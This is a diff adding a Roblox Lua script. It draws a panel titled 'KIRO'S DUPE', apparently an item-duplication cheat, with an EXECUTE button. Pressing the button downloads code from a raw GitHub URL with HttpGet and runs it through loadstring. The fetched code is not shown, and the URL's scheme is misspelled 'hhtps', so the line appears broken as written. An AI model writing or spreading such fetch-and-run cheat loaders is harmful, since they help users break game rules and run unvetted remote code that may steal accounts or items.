@@ -1,0 +1,47 @@
+--PROTECTED BY KIROV2
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local TextButton = Instance.new("TextButton")
+local TextLabel_2 = Instance.new("TextLabel")
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui. ResetOnSpawn = false
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
+Frame.Position = UDim2.new(0.287703007, 0, 0.253164589, 0)
+Frame.Size = UDim2.new(0, 389, 0, 193)
+Frame.Active = true
+Frame.Draggable = true
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.Size = UDim2.new(0, 389, 0, 32)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = " WELCOME TO KIRO'S DUPE"
+TextLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
+TextLabel.TextSize = 27.000
+
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+TextButton.Position = UDim2.new(0.334575832, 0, 0.334455997, 0)
+TextButton.Size = UDim2.new(0, 128, 0, 45)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "EXECUTE"
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextSize = 25.000
+
+TextLabel_2.Parent = Frame
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(158, 158, 158)
+TextLabel_2.Position = UDim2.new(0, 0, 0.735751212, 0)
+TextLabel_2.Size = UDim2.new(0, 389, 0, 50)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = "THE INSTRUCTIONS WILL BE GIVEN ON CHAT"
+TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.TextSize = 24.000
+TextButton.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('hhtps://raw.githubusercontent.com/DUPEBYKIRO/DupeOnly1/main/GwapoKiro'),true))()
+end)
